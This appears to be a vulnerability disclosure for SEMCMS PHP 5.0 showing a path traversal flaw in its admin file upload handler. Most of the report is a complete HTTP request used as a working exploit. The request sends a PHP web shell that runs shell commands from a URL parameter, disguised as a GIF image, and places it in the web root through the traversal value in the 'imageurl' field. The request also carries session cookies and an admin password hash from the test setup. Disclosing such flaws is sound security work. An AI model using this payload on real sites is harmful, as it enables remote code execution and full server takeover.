#### 1. Path Traversal Vulnerability (CWE-22)
downland_url:https://www.sem-cms.com/TradeCmsdown/php/semcms_php_5.0.zip

**Vulnerability Description:**
The code directly receives user-controlled path parameters through `$Imageurl = $_POST["imageurl"]` without normalization. An attacker can craft a payload like `imageurl=../Images/default/../../` to bypass the preset storage path restrictions and upload files to any directory.

**Key Code Analysis:**

```php
$Imageurl = $_POST["imageurl"];
move_uploaded_file($_FILES["file"]["tmp_name"], $Imageurl.$newname);
```

- **Vulnerability Point:** Direct concatenation of user-controllable `$Imageurl` with the generated filename, without path normalization.
- **Attack Effect:** Using `../../` to achieve directory traversal, such as uploading to the website root directory (the final storage path for the file in this example is `/var/www/html/`).

```
POST /1cj5Mn_Admin/SEMCMS_Upfile.php HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Length: 836
Origin: http://127.0.0.1:8000
Connection: keep-alive
Referer: http://127.0.0.1:8000/1cj5Mn_Admin/SEMCMS_Upload.php?Imageurl=../Images/default/&filed=down_file&filedname=form
Cookie: csrftoken=DC1ie5F1GBasnO3BOxBk7lQ26Ee82lQM; _ga_R1FN4KJKJH=GS1.1.1731064454.3.1.1731065715.0.0.0; _ga=GA1.1.1573617850.1730626906; 4411def9d576984c8d78253236b2a62f__typecho_uid=1; 4411def9d576984c8d78253236b2a62f__typecho_authCode=%24T%24B0Y0sei2u2a444450e82362ddf26030b5474ad3c6; PHPSESSID=va4k07vvgftbnhaomq31s87np1; csrf_cookie_name=d9764bb0c2711f0ce2444be389abeb68; xunruicms_527064877b6d641aa8c19449a87beacc=tmuo9h6ga29i2pel1evd7qh8fs9cpbvg; 527064877b6d641aa8c19449a87beacc_member_uid=1; 527064877b6d641aa8c19449a87beacc_member_cookie=2da9437e47038d33a019eac9432349d7; __tins__4329483=%7B%22sid%22%3A%201739256022241%2C%20%22vd%22%3A%202%2C%20%22expires%22%3A%201739257829169%7D; __51cke__=; __51laig__=2; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="wname"


------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="file"; filename="2.zip"
Content-Type: image/png

GIF89a;
<?php system($_GET['cmd']); ?>
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="imageurl"

../Images/default/../../../
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="filed"

down_file
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="filedname"

form
------geckoformboundary7885279eed7384fc280d6248a79275ff
Content-Disposition: form-data; name="submit"

Submit
------geckoformboundary7885279eed7384fc280d6248a79275ff--

```

Payload:

```
../Images/default/../../../
```

![image](https://github.com/user-attachments/assets/bc05e238-e7cd-4488-9a59-3edba79e7f41)


Uploaded to the website root directory.

![image](https://github.com/user-attachments/assets/05d61fec-e921-43c9-ac34-a1bed4055b60)
